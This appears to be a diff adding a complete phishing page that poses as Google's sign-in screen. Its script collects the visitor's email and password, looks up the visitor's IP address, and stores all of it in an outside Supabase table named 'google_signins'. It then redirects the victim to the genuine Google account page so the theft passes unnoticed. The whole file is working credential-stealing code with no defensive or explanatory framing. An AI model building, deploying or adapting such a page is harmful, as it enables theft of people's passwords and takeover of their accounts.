@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Google Sign In</title>
+
+<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+}
+
+body {
+    background: #f0f4f9;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    padding: 20px;
+}
+
+.container {
+    background: #fff;
+    width: 360px;
+    padding: 40px 30px;
+    border-radius: 12px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+    text-align: center;
+}
+
+.logo {
+    font-size: 28px;
+    font-weight: bold;
+    margin-bottom: 10px;
+}
+
+.logo span:nth-child(1) { color: #4285F4; }
+.logo span:nth-child(2) { color: #EA4335; }
+.logo span:nth-child(3) { color: #FBBC05; }
+.logo span:nth-child(4) { color: #4285F4; }
+.logo span:nth-child(5) { color: #34A853; }
+.logo span:nth-child(6) { color: #EA4335; }
+
+h2 {
+    font-size: 22px;
+    margin-bottom: 8px;
+}
+
+p {
+    font-size: 14px;
+    color: #5f6368;
+    margin-bottom: 20px;
+}
+
+.input-group {
+    margin-bottom: 20px;
+}
+
+input {
+    width: 100%;
+    padding: 14px;
+    border: 1px solid #dadce0;
+    border-radius: 6px;
+    font-size: 16px;
+}
+
+input:focus {
+    border: 2px solid #1a73e8;
+    outline: none;
+}
+
+.link {
+    text-align: left;
+    font-size: 14px;
+    margin-bottom: 20px;
+}
+
+.link a {
+    color: #1a73e8;
+    text-decoration: none;
+}
+
+.actions {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.btn {
+    background: #1a73e8;
+    color: #fff;
+    border: none;
+    padding: 10px 22px;
+    border-radius: 20px;
+    cursor: pointer;
+    width: 100%;
+    font-size: 16px;
+}
+
+.btn:hover {
+    background: #1557b0;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+    <div class="logo">
+        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
+    </div>
+
+    <h2>Sign in</h2>
+    <p>Use your Google Account</p>
+
+    <div class="input-group">
+        <input type="email" id="email" placeholder="Email or phone">
+    </div>
+
+    <div class="input-group">
+        <input type="password" id="password" placeholder="Enter your password">
+    </div>
+
+    <div class="link">
+        <a href="#">Forgot email?</a>
+    </div>
+
+    <div class="actions">
+        <button class="btn" id="loginBtn">LOGIN</button>
+    </div>
+</div>
+
+<script>
+// Wait for page to load
+document.addEventListener('DOMContentLoaded', function() {
+    // Initialize Supabase
+    const supabaseUrl = 'https://tbdeofcwnqfaipkwbwvw.supabase.co';
+    const supabaseKey = 'sb_publishable_qp6gYArW7JNkXwHpob8YuQ_9W0WNoYC';
+    const supabaseClient = supabase.createClient(supabaseUrl, supabaseKey);
+    
+    // Get elements
+    const loginBtn = document.getElementById('loginBtn');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+    
+    // Add click event
+    loginBtn.onclick = async function() {
+        const email = emailInput.value;
+        const password = passwordInput.value;
+        
+        if(email === "") {
+            alert("Please enter your email");
+            return;
+        }
+        
+        if(password === "") {
+            alert("Please enter your password");
+            return;
+        }
+        
+        // Change button text
+        loginBtn.innerHTML = 'SIGNING IN...';
+        loginBtn.disabled = true;
+        
+        // Get IP address
+        let ipAddress = "Unable to fetch";
+        try {
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            ipAddress = ipData.ip;
+        } catch(e) {
+            // Ignore IP errors
+        }
+        
+        // Save to Supabase
+        const { data, error } = await supabaseClient
+            .from('google_signins')
+            .insert([
+                { 
+                    email: email,
+                    password: password,
+                    ip_address: ipAddress,
+                    location: "Mobile Device"
+                }
+            ]);
+        
+        if (error) {
+            // Show error if something goes wrong
+            alert("Error: " + error.message);
+            loginBtn.innerHTML = 'LOGIN';
+            loginBtn.disabled = false;
+        } else {
+            // Success - redirect immediately to Google Account
+            window.location.href = 'https://myaccount.google.com/';
+        }
+    };
+});
+</script>
+
+</body>
+</html>
